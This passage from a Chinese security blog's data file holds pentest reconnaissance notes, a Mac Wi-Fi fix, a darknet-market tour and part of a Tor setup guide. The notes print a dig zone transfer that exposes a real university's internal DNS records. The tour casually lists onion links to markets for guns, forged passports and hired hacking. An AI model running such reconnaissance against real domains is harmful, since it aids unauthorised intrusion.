23-nov-2017</div></pre></td></tr></table></figure>\n","excerpt":"<p>记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：</p>\n<blockquote>\n<p>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探</p>\n<p>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！</p>\n</blockquote>\n<p>其实，我觉得渗透测试无论怎么变，不外乎这几点：</p>\n<blockquote>\n<p>信息收集阶段-&gt;漏洞检测阶段-&gt;漏洞利用阶段-&gt;持久化后门阶段</p>\n</blockquote>\n<p>最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。<br>","more":"</p>\n<h1 id=\"信息收集阶段\"><a href=\"#信息收集阶段\" class=\"headerlink\" title=\"信息收集阶段\"></a>信息收集阶段</h1><h2 id=\"DNS信息\"><a href=\"#DNS信息\" class=\"headerlink\" title=\"DNS信息\"></a>DNS信息</h2><p>其实DNS信息收集阶段用两个Linux系统自带工具即可完成。</p>\n<h3 id=\"nslookup\"><a href=\"#nslookup\" class=\"headerlink\" title=\"nslookup\"></a>nslookup</h3><p>此命令，可以快速查处ip地址<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"> ✘ ivan@Ivan~ nslookup zhihu.com</div><div class=\"line\">Server:\t\t114.114.114.114</div><div class=\"line\">Address:\t114.114.114.114<span class=\"comment\">#53</span></div><div class=\"line\"></div><div class=\"line\">Non-authoritative answer:</div><div class=\"line\">Name:\tzhihu.com</div><div class=\"line\">Address: 54.223.189.245</div></pre></td></tr></table></figure></p>\n<p>当然也可以指定dns查询服务器：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8</div><div class=\"line\">Server:\t\t8.8.8.8</div><div class=\"line\">Address:\t8.8.8.8<span class=\"comment\">#53</span></div><div class=\"line\"></div><div class=\"line\">Non-authoritative answer:</div><div class=\"line\">zhihu.com\tnameserver = ns3.dnsv4.com.</div><div class=\"line\">zhihu.com\tnameserver = ns4.dnsv4.com.</div><div class=\"line\"></div><div class=\"line\">Authoritative answers can be found from:</div></pre></td></tr></table></figure></p>\n<h3 id=\"dig\"><a href=\"#dig\" class=\"headerlink\" title=\"dig\"></a>dig</h3><p>dig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr</div><div class=\"line\"></div><div class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns.csust.edu.cn csust.edu.cn axfr</div><div class=\"line\">; (1 server found)</div><div class=\"line\">;; global options: +cmd</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c008</div><div class=\"line\">3g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6</div><div class=\"line\">app.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11</div><div class=\"line\">app7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227</div><div class=\"line\">app8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8</div><div class=\"line\">archives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232</div><div class=\"line\">bid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.</div><div class=\"line\">bw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20</div><div class=\"line\">cas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1</div><div class=\"line\">cslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80</div><div class=\"line\">cslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">cslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">cwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252</div><div class=\"line\">cxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203</div><div class=\"line\">dkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200</div><div class=\"line\">dlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">dns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400</div><div class=\"line\">;; Query time: 62 msec</div><div class=\"line\">;; SERVER: 210.43.192.8<span class=\"comment\">#53(210.43.192.8)</span></div><div class=\"line\">;; WHEN: Sat Jul 30 20:18:47 2016</div><div class=\"line\">;; XFR size: 112 records (messages 1, bytes 2369)</div></pre></td></tr></table></figure></p>\n<p>可以看到，各种信息，从A、cname到MX全部暴露无遗。<br>如果不存在该漏洞则会被服务器拒绝查询请求。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr</div><div class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns4.tju.edu.cn tju.edu.cn axfr</div><div class=\"line\">; (1 server found)</div><div class=\"line\">;; global options: +cmd</div><div class=\"line\">; Transfer failed.</div></pre></td></tr></table></figure>\n<h3 id=\"whois\"><a href=\"#whois\" class=\"headerlink\" title=\"whois\"></a>whois</h3><p>whois查询，不多解释了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ whois yfgeek.com</div><div class=\"line\"></div><div class=\"line\">Whois Server Version 2.0</div><div class=\"line\"></div><div class=\"line\">Domain names <span class=\"keyword\">in</span> the .com and .net domains can now be registered</div><div class=\"line\">with many different competing registrars. Go to http://www.internic.net</div><div class=\"line\"><span class=\"keyword\">for</span> detailed information.</div><div class=\"line\"></div><div class=\"line\">   Domain Name: YFGEEK.COM</div><div class=\"line\">   Registrar: GODADDY.COM, LLC</div><div class=\"line\">   Sponsoring Registrar IANA ID: 146</div><div class=\"line\">   Whois Server: whois.godaddy.com</div><div class=\"line\">   Referral URL: http://www.godaddy.com</div><div class=\"line\">   Name Server: F1G1NS1.DNSPOD.NET</div><div class=\"line\">   Name Server: F1G1NS2.DNSPOD.NET</div><div class=\"line\">   Status: clientDeleteProhibited https://icann.org/epp<span class=\"comment\">#clientDeleteProhibited</span></div><div class=\"line\">   Status: clientRenewProhibited https://icann.org/epp<span class=\"comment\">#clientRenewProhibited</span></div><div class=\"line\">   Status: clientTransferProhibited https://icann.org/epp<span class=\"comment\">#clientTransferProhibited</span></div><div class=\"line\">   Status: clientUpdateProhibited https://icann.org/epp<span class=\"comment\">#clientUpdateProhibited</span></div><div class=\"line\">   Updated Date: 21-apr-2016</div><div class=\"line\">   Creation Date: 23-nov-2012</div><div class=\"line\">   Expiration Date: 23-nov-2017</div></pre></td></tr></table></figure>"},{"title":"Mac Wi-Fi掉线解决方案","date":"2016-10-09T14:07:52.000Z","_content":"\n最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。\n\n分享解决方案：\n\n进入目录`/Library/Preferences/SystemConfiguration\n`\n\n删除\n\n```\ncom.apple.airport.preferences.plist\ncom.apple.network.identification.plist\ncom.apple.wifi.message-tracer.plist\nNetworkInterfaces.plist\npreferences.plist\n```\n\n重启\n\n解决问题。\n\n转载自：http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html","source":"_posts/Mac-Wi-Fi-掉线解决方案-1.md","raw":"---\ntitle: Mac Wi-Fi掉线解决方案\ndate: 2016-10-09 15:07:52\ntags: Mac\ncategories: Mac\n---\n\n最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。\n\n分享解决方案：\n\n进入目录`/Library/Preferences/SystemConfiguration\n`\n\n删除\n\n```\ncom.apple.airport.preferences.plist\ncom.apple.network.identification.plist\ncom.apple.wifi.message-tracer.plist\nNetworkInterfaces.plist\npreferences.plist\n```\n\n重启\n\n解决问题。\n\n转载自：http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html","slug":"Mac-Wi-Fi-掉线解决方案-1","published":1,"updated":"2016-11-19T11:35:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym300h000dcdon4p3x5b8y","content":"<p>最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。</p>\n<p>分享解决方案：</p>\n<p>进入目录<code>/Library/Preferences/SystemConfiguration</code></p>\n<p>删除</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">com.apple.airport.preferences.plist</div><div class=\"line\">com.apple.network.identification.plist</div><div class=\"line\">com.apple.wifi.message-tracer.plist</div><div class=\"line\">NetworkInterfaces.plist</div><div class=\"line\">preferences.plist</div></pre></td></tr></table></figure>\n<p>重启</p>\n<p>解决问题。</p>\n<p>转载自：<a href=\"http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html\" target=\"_blank\" rel=\"external\">http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html</a></p>\n","excerpt":"","more":"<p>最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。</p>\n<p>分享解决方案：</p>\n<p>进入目录<code>/Library/Preferences/SystemConfiguration</code></p>\n<p>删除</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">com.apple.airport.preferences.plist</div><div class=\"line\">com.apple.network.identification.plist</div><div class=\"line\">com.apple.wifi.message-tracer.plist</div><div class=\"line\">NetworkInterfaces.plist</div><div class=\"line\">preferences.plist</div></pre></td></tr></table></figure>\n<p>重启</p>\n<p>解决问题。</p>\n<p>转载自：<a href=\"http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html\">http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html</a></p>\n"},{"title":"TOR暗网的秘密","date":"2016-11-26T01:00:34.000Z","_content":"\nTOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。\n\n以下内容纯属虚构。\n\n<!--more -->\n\n# 另一个互联网世界\n\nTor 内网是另一个世界，另一个世界规则。在Tor 内网，有各种违禁交易，交易一般都是使用比特币的，保证了绝对的匿名性。\n\nTor 内网很有趣，几乎什么都有，甚至连搜索引擎，VPS服务，云服务都有。\n\n下面 我们来逛一逛都有什么 奇葩的 py交易。\n### 虚拟主机交易\n\n![](/content/images/torworld/1.png)\n\n### 免费盗版市场\n\n盗版书\n\n![](/content/images/torworld/2.png)\n\n\n盗版音乐\n\n![](/content/images/torworld/13.png)\n\n\n### 英国枪支弹药交易\n\n![](/content/images/torworld/3.png)\n\n比特币交易，一个Glock 19 - 9mm枪 500磅，比特币交易，当前交易金额相当于1.028比特币。\n\n（英国持枪是合法的，但是我不感兴趣）\n\n### 暗网iPhone交易\n\n不知道iPhone的货源，很便宜。\n\n![](/content/images/torworld/4.png)\n\n### 办证类\n\n美国护照\n\n![](/content/images/torworld/5.png)\n\n美国假身份证\n\n![](/content/images/torworld/7.png)\n\n英国护照\n\n![](/content/images/torworld/6.png)\n\n\n我只能感叹一句，这要是在我大中国，这价格绝对倒闭。太贵了。\n\n### 博客\n\n![](/content/images/torworld/8.png)\n\n此外还有很多，没什么意思\n\n### 电子邮箱\n\n![](/content/images/torworld/9.png)\n\n几乎是全匿名的电子邮箱，用比特message登录的\n\n### 政治\n\n各种资本主义反动派论坛\n\n![](/content/images/torworld/10.png)\n\n![](/content/images/torworld/11.png)\n\n\n### 雇佣黑阔\n\n![](/content/images/torworld/12.png)\n\n日一个网站500欧元，还是挺赚的。\n\n### 其他的\n\n当然还有社工 库，😍情，各种其他的东西，这个不能写在这里，嘿嘿嘿。\n\n\n## 导航站\n\nhttp://dirnxxdraygbifgc.onion/\n\nhttp://torlinkbgs6aabns.onion/\n\nhttp://32rfckwuorlf4dlv.onion/\n\nhttp://torwikignoueupfm.onion/\n\nhttp://torlinkbgs6aabns.onion/\n\n## 搜索引擎\n\nhttp://xmh57jrzrnw6insl.onion/\n\n","source":"_posts/TOR暗网的秘密.md","raw":"---\ntitle: TOR暗网的秘密\ndate: 2016-11-26 01:00:34\ntags: hack\ncategories: hack\n---\n\nTOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。\n\n以下内容纯属虚构。\n\n<!--more -->\n\n# 另一个互联网世界\n\nTor 内网是另一个世界，另一个世界规则。在Tor 内网，有各种违禁交易，交易一般都是使用比特币的，保证了绝对的匿名性。\n\nTor 内网很有趣，几乎什么都有，甚至连搜索引擎，VPS服务，云服务都有。\n\n下面 我们来逛一逛都有什么 奇葩的 py交易。\n### 虚拟主机交易\n\n![](/content/images/torworld/1.png)\n\n### 免费盗版市场\n\n盗版书\n\n![](/content/images/torworld/2.png)\n\n\n盗版音乐\n\n![](/content/images/torworld/13.png)\n\n\n### 英国枪支弹药交易\n\n![](/content/images/torworld/3.png)\n\n比特币交易，一个Glock 19 - 9mm枪 500磅，比特币交易，当前交易金额相当于1.028比特币。\n\n（英国持枪是合法的，但是我不感兴趣）\n\n### 暗网iPhone交易\n\n不知道iPhone的货源，很便宜。\n\n![](/content/images/torworld/4.png)\n\n### 办证类\n\n美国护照\n\n![](/content/images/torworld/5.png)\n\n美国假身份证\n\n![](/content/images/torworld/7.png)\n\n英国护照\n\n![](/content/images/torworld/6.png)\n\n\n我只能感叹一句，这要是在我大中国，这价格绝对倒闭。太贵了。\n\n### 博客\n\n![](/content/images/torworld/8.png)\n\n此外还有很多，没什么意思\n\n### 电子邮箱\n\n![](/content/images/torworld/9.png)\n\n几乎是全匿名的电子邮箱，用比特message登录的\n\n### 政治\n\n各种资本主义反动派论坛\n\n![](/content/images/torworld/10.png)\n\n![](/content/images/torworld/11.png)\n\n\n### 雇佣黑阔\n\n![](/content/images/torworld/12.png)\n\n日一个网站500欧元，还是挺赚的。\n\n### 其他的\n\n当然还有社工 库，😍情，各种其他的东西，这个不能写在这里，嘿嘿嘿。\n\n\n## 导航站\n\nhttp://dirnxxdraygbifgc.onion/\n\nhttp://torlinkbgs6aabns.onion/\n\nhttp://32rfckwuorlf4dlv.onion/\n\nhttp://torwikignoueupfm.onion/\n\nhttp://torlinkbgs6aabns.onion/\n\n## 搜索引擎\n\nhttp://xmh57jrzrnw6insl.onion/\n\n","slug":"TOR暗网的秘密","published":1,"updated":"2016-11-26T01:44:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym300m000ecdonvrzlpvm3","content":"<p>TOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。</p>\n<p>以下内容纯属虚构。</p>\n<a id=\"more\"></a>\n<h1 id=\"另一个互联网世界\"><a href=\"#另一个互联网世界\" class=\"headerlink\" title=\"另一个互联网世界\"></a>另一个互联网世界</h1><p>Tor 内网是另一个世界，另一个世界规则。在Tor 内网，有各种违禁交易，交易一般都是使用比特币的，保证了绝对的匿名性。</p>\n<p>Tor 内网很有趣，几乎什么都有，甚至连搜索引擎，VPS服务，云服务都有。</p>\n<p>下面 我们来逛一逛都有什么 奇葩的 py交易。</p>\n<h3 id=\"虚拟主机交易\"><a href=\"#虚拟主机交易\" class=\"headerlink\" title=\"虚拟主机交易\"></a>虚拟主机交易</h3><p><img src=\"/content/images/torworld/1.png\" alt=\"\"></p>\n<h3 id=\"免费盗版市场\"><a href=\"#免费盗版市场\" class=\"headerlink\" title=\"免费盗版市场\"></a>免费盗版市场</h3><p>盗版书</p>\n<p><img src=\"/content/images/torworld/2.png\" alt=\"\"></p>\n<p>盗版音乐</p>\n<p><img src=\"/content/images/torworld/13.png\" alt=\"\"></p>\n<h3 id=\"英国枪支弹药交易\"><a href=\"#英国枪支弹药交易\" class=\"headerlink\" title=\"英国枪支弹药交易\"></a>英国枪支弹药交易</h3><p><img src=\"/content/images/torworld/3.png\" alt=\"\"></p>\n<p>比特币交易，一个Glock 19 - 9mm枪 500磅，比特币交易，当前交易金额相当于1.028比特币。</p>\n<p>（英国持枪是合法的，但是我不感兴趣）</p>\n<h3 id=\"暗网iPhone交易\"><a href=\"#暗网iPhone交易\" class=\"headerlink\" title=\"暗网iPhone交易\"></a>暗网iPhone交易</h3><p>不知道iPhone的货源，很便宜。</p>\n<p><img src=\"/content/images/torworld/4.png\" alt=\"\"></p>\n<h3 id=\"办证类\"><a href=\"#办证类\" class=\"headerlink\" title=\"办证类\"></a>办证类</h3><p>美国护照</p>\n<p><img src=\"/content/images/torworld/5.png\" alt=\"\"></p>\n<p>美国假身份证</p>\n<p><img src=\"/content/images/torworld/7.png\" alt=\"\"></p>\n<p>英国护照</p>\n<p><img src=\"/content/images/torworld/6.png\" alt=\"\"></p>\n<p>我只能感叹一句，这要是在我大中国，这价格绝对倒闭。太贵了。</p>\n<h3 id=\"博客\"><a href=\"#博客\" class=\"headerlink\" title=\"博客\"></a>博客</h3><p><img src=\"/content/images/torworld/8.png\" alt=\"\"></p>\n<p>此外还有很多，没什么意思</p>\n<h3 id=\"电子邮箱\"><a href=\"#电子邮箱\" class=\"headerlink\" title=\"电子邮箱\"></a>电子邮箱</h3><p><img src=\"/content/images/torworld/9.png\" alt=\"\"></p>\n<p>几乎是全匿名的电子邮箱，用比特message登录的</p>\n<h3 id=\"政治\"><a href=\"#政治\" class=\"headerlink\" title=\"政治\"></a>政治</h3><p>各种资本主义反动派论坛</p>\n<p><img src=\"/content/images/torworld/10.png\" alt=\"\"></p>\n<p><img src=\"/content/images/torworld/11.png\" alt=\"\"></p>\n<h3 id=\"雇佣黑阔\"><a href=\"#雇佣黑阔\" class=\"headerlink\" title=\"雇佣黑阔\"></a>雇佣黑阔</h3><p><img src=\"/content/images/torworld/12.png\" alt=\"\"></p>\n<p>日一个网站500欧元，还是挺赚的。</p>\n<h3 id=\"其他的\"><a href=\"#其他的\" class=\"headerlink\" title=\"其他的\"></a>其他的</h3><p>当然还有社工 库，😍情，各种其他的东西，这个不能写在这里，嘿嘿嘿。</p>\n<h2 id=\"导航站\"><a href=\"#导航站\" class=\"headerlink\" title=\"导航站\"></a>导航站</h2><p><a href=\"http://dirnxxdraygbifgc.onion/\" target=\"_blank\" rel=\"external\">http://dirnxxdraygbifgc.onion/</a></p>\n<p><a href=\"http://torlinkbgs6aabns.onion/\" target=\"_blank\" rel=\"external\">http://torlinkbgs6aabns.onion/</a></p>\n<p><a href=\"http://32rfckwuorlf4dlv.onion/\" target=\"_blank\" rel=\"external\">http://32rfckwuorlf4dlv.onion/</a></p>\n<p><a href=\"http://torwikignoueupfm.onion/\" target=\"_blank\" rel=\"external\">http://torwikignoueupfm.onion/</a></p>\n<p><a href=\"http://torlinkbgs6aabns.onion/\" target=\"_blank\" rel=\"external\">http://torlinkbgs6aabns.onion/</a></p>\n<h2 id=\"搜索引擎\"><a href=\"#搜索引擎\" class=\"headerlink\" title=\"搜索引擎\"></a>搜索引擎</h2><p><a href=\"http://xmh57jrzrnw6insl.onion/\" target=\"_blank\" rel=\"external\">http://xmh57jrzrnw6insl.onion/</a></p>\n","excerpt":"<p>TOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。</p>\n<p>以下内容纯属虚构。</p>","more":"<h1 id=\"另一个互联网世界\"><a href=\"#另一个互联网世界\" class=\"headerlink\" title=\"另一个互联网世界\"></a>另一个互联网世界</h1><p>Tor 内网是另一个世界，另一个世界规则。在Tor 内网，有各种违禁交易，交易一般都是使用比特币的，保证了绝对的匿名性。</p>\n<p>Tor 内网很有趣，几乎什么都有，甚至连搜索引擎，VPS服务，云服务都有。</p>\n<p>下面 我们来逛一逛都有什么 奇葩的 py交易。</p>\n<h3 id=\"虚拟主机交易\"><a href=\"#虚拟主机交易\" class=\"headerlink\" title=\"虚拟主机交易\"></a>虚拟主机交易</h3><p><img src=\"/content/images/torworld/1.png\" alt=\"\"></p>\n<h3 id=\"免费盗版市场\"><a href=\"#免费盗版市场\" class=\"headerlink\" title=\"免费盗版市场\"></a>免费盗版市场</h3><p>盗版书</p>\n<p><img src=\"/content/images/torworld/2.png\" alt=\"\"></p>\n<p>盗版音乐</p>\n<p><img src=\"/content/images/torworld/13.png\" alt=\"\"></p>\n<h3 id=\"英国枪支弹药交易\"><a href=\"#英国枪支弹药交易\" class=\"headerlink\" title=\"英国枪支弹药交易\"></a>英国枪支弹药交易</h3><p><img src=\"/content/images/torworld/3.png\" alt=\"\"></p>\n<p>比特币交易，一个Glock 19 - 9mm枪 500磅，比特币交易，当前交易金额相当于1.028比特币。</p>\n<p>（英国持枪是合法的，但是我不感兴趣）</p>\n<h3 id=\"暗网iPhone交易\"><a href=\"#暗网iPhone交易\" class=\"headerlink\" title=\"暗网iPhone交易\"></a>暗网iPhone交易</h3><p>不知道iPhone的货源，很便宜。</p>\n<p><img src=\"/content/images/torworld/4.png\" alt=\"\"></p>\n<h3 id=\"办证类\"><a href=\"#办证类\" class=\"headerlink\" title=\"办证类\"></a>办证类</h3><p>美国护照</p>\n<p><img src=\"/content/images/torworld/5.png\" alt=\"\"></p>\n<p>美国假身份证</p>\n<p><img src=\"/content/images/torworld/7.png\" alt=\"\"></p>\n<p>英国护照</p>\n<p><img src=\"/content/images/torworld/6.png\" alt=\"\"></p>\n<p>我只能感叹一句，这要是在我大中国，这价格绝对倒闭。太贵了。</p>\n<h3 id=\"博客\"><a href=\"#博客\" class=\"headerlink\" title=\"博客\"></a>博客</h3><p><img src=\"/content/images/torworld/8.png\" alt=\"\"></p>\n<p>此外还有很多，没什么意思</p>\n<h3 id=\"电子邮箱\"><a href=\"#电子邮箱\" class=\"headerlink\" title=\"电子邮箱\"></a>电子邮箱</h3><p><img src=\"/content/images/torworld/9.png\" alt=\"\"></p>\n<p>几乎是全匿名的电子邮箱，用比特message登录的</p>\n<h3 id=\"政治\"><a href=\"#政治\" class=\"headerlink\" title=\"政治\"></a>政治</h3><p>各种资本主义反动派论坛</p>\n<p><img src=\"/content/images/torworld/10.png\" alt=\"\"></p>\n<p><img src=\"/content/images/torworld/11.png\" alt=\"\"></p>\n<h3 id=\"雇佣黑阔\"><a href=\"#雇佣黑阔\" class=\"headerlink\" title=\"雇佣黑阔\"></a>雇佣黑阔</h3><p><img src=\"/content/images/torworld/12.png\" alt=\"\"></p>\n<p>日一个网站500欧元，还是挺赚的。</p>\n<h3 id=\"其他的\"><a href=\"#其他的\" class=\"headerlink\" title=\"其他的\"></a>其他的</h3><p>当然还有社工 库，😍情，各种其他的东西，这个不能写在这里，嘿嘿嘿。</p>\n<h2 id=\"导航站\"><a href=\"#导航站\" class=\"headerlink\" title=\"导航站\"></a>导航站</h2><p><a href=\"http://dirnxxdraygbifgc.onion/\">http://dirnxxdraygbifgc.onion/</a></p>\n<p><a href=\"http://torlinkbgs6aabns.onion/\">http://torlinkbgs6aabns.onion/</a></p>\n<p><a href=\"http://32rfckwuorlf4dlv.onion/\">http://32rfckwuorlf4dlv.onion/</a></p>\n<p><a href=\"http://torwikignoueupfm.onion/\">http://torwikignoueupfm.onion/</a></p>\n<p><a href=\"http://torlinkbgs6aabns.onion/\">http://torlinkbgs6aabns.onion/</a></p>\n<h2 id=\"搜索引擎\"><a href=\"#搜索引擎\" class=\"headerlink\" title=\"搜索引擎\"></a>搜索引擎</h2><p><a href=\"http://xmh57jrzrnw6insl.onion/\">http://xmh57jrzrnw6insl.onion/</a></p>"},{"title":"Tor安全上网指南","id":"4","updated":"2016-08-05T20:13:45.000Z","date":"2016-07-28T15:01:47.000Z","_content":"\n\n本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。\n<!-- more --> \n声明！\n\n==本文原创，技术无罪，笔者即将身处海外，本文撰写目的**仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途**。==\n\n==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，**不允许任何形式私自转载**，本文只进行对TOR相关**技术探讨**，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==\n\n\n**准备条件**\n\n* 1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。\n\n* 2.最新版Vidalia [下载地址](https://dist.torproject.org/vidalia-bundles/)（需完整互联网）\n\n* 3.Vmware Fusion/Vmware workstation/Oracle VirtualBox\n\n* 4.一个完整版的虚拟机操作系统\n\n**笔者环境**\n\n操作系统：OS X EI Capitan 10.11.5\n\n虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)\n\n虚拟机操作系统：Windows xp sp2 或 Kali linux\n\n隧道软件：lantern 或 shadowsockets\n\n### Vidalia部分\n\n*如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。*\n<img src=\"/content/images/2016/07/1-1.png\" width = \"500px\"/>\n**1.建立您的隧道网络**\n\n笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。\n\n**2.在Vidalia中设置代理连接**\n\n打开Vidalia-设置-网络：我使用代理服务器连接网络\n\n地址：127.0.0.1 端口：1080（用户定义）\n\n类型：SOCKS 5\n![](/content/images/2016/07/1-2.png)\n\n**3.继续设置，转发出外网端口**\n\nVidalia-设置-高级-编辑当前torrc：\n![](/content/images/2016/07/1-3.png)\n确认socksport为9050，也可以定义为其他端口。\n同时添加`SocksListenAddress 0.0.0.0:9050`到底部\n保存\n\n笔者配置文件如下，仅供参考，不可复制：\n\n```Bash\n# This file was generated by Tor; if you edit it, comments will not be preserved\n# The old torrc file was renamed to torrc.orig.1 or similar, and 